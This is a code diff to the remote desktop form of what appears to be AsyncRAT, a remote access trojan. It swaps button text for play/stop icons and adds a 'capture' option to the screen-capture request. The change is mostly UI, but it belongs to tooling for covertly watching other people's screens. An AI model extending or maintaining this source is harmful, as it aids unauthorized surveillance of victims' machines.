@@ -62,6 +62,7 @@ namespace AsyncRAT_Sharp.Forms
             {
                 button2.Top = panel1.Bottom + 5;
                 button2.Left = pictureBox1.Width / 2;
+                button1.Tag = (object)"stop";
                 button2.PerformClick();
             }
             catch { }
@@ -69,30 +70,32 @@ namespace AsyncRAT_Sharp.Forms
 
         private void Button1_Click(object sender, EventArgs e)
         {
-            if (button1.Text == "START")
+            if (button1.Tag == (object)"play")
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                msgpack.ForcePathObject("Option").AsString = "capture";
                 msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
                 msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value);
                 decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                 ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = false;
                 numericUpDown2.Enabled = false;
-                button1.Text = "STOP";
+                button1.Tag = (object)"stop";
+                button1.BackgroundImage = Properties.Resources.stop__1_;
             }
             else
             {
-                button1.Text = "START";
-                numericUpDown1.Enabled = true;
-                numericUpDown2.Enabled = true;
+                button1.Tag = (object)"play";
                 try
                 {
-                    C2.ClientSocket.Dispose();
                     C2.Disconnected();
                     C2 = null;
                 }
                 catch { }
+                numericUpDown1.Enabled = true;
+                numericUpDown2.Enabled = true;
+                button1.BackgroundImage = Properties.Resources.play_button;
             }
         }
 
